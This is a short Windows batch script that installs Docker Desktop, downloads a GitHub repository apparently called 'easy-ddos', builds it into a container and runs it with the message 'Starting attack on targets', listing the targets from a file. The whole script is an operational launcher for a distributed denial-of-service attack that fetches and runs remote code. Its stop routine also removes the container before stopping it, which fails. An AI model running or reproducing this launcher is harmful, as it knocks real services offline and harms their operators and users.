@set "REPO_NAME=easy-ddos"
@set "ACTUAL_TAG=master"

@curl -L "https://desktop.docker.com/win/main/amd64/Docker Desktop Installer.exe" -o dockerinstaller.exe
@dockerinstaller.exe

@set "URL=http://github.com/julfy/%REPO_NAME%/archive/refs/heads/%ACTUAL_TAG%.zip"
:: from tag: @set "URL=http://github.com/julfy/%REPO_NAME%/archive/refs/tags/%ACTUAL_TAG%.zip"

@curl -L %URL% -o %ACTUAL_TAG%.zip"
@powershell -NoP -NonI -Command "Expand-Archive %ACTUAL_TAG%.zip %REPO_NAME%"
@move %REPO_NAME%\%REPO_NAME%-%ACTUAL_TAG%\* %REPO_NAME%

@cd %REPO_NAME%
docker build --no-cache --tag %REPO_NAME% .

@echo.
@echo Starting attack on targets:
@type targets.txt
@echo.

@for /f %%i in ('docker run -d %REPO_NAME%') do set CONTAINER_ID=%%i

@echo Press any key to stop
@pause >nul

@echo Stopping...

docker rm %CONTAINER_ID%
docker stop %CONTAINER_ID%

@echo Stopped.

@pause >nul
